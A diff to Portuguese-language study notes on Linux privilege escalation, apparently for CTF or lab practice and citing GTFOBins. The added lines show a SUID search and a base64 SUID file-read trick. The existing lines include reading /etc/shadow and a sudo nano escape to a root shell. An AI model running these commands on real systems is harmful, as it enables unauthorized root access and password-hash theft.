@@ -6,10 +6,22 @@ https://gtfobins.github.io/
 
 voce pode procurar exploits para uma determinada maquina sabendo a versao (voce pode saber a versao utilizando "cat /proc/version")
 
+find / -perm -04000 2>/dev/null (para procurar por suids)
+
 cat /etc/shadow (e onde fica as hash de password)
 
 reset; sh 1>&0 2>&0 (exploit para subir para root em usuarios que tenham sudo nano "permissao sudo pro nano") voce da ctrl + r, depois cola os parametros, depois da ctrl + x
 
 sudo -l (mostra as permissoes do usuario atual)
+
+suid base64: caso voce esteja em uma maquina, voce da um find suids, e encontra um suid base64 voce pode explorar ele com os seguintes parametros tirados do GTFOBins:
+
+LFILE=file_to_read
+base64 "$LFILE" | base64 --decode
+
+usando isso voce pode ler arquivos mesmo nao tendo permissao
+lembre de colocar o usr/bin/base64 "$LFILE" | base64 --decode
+para setar o caminho do base64
+
 
 ---END---
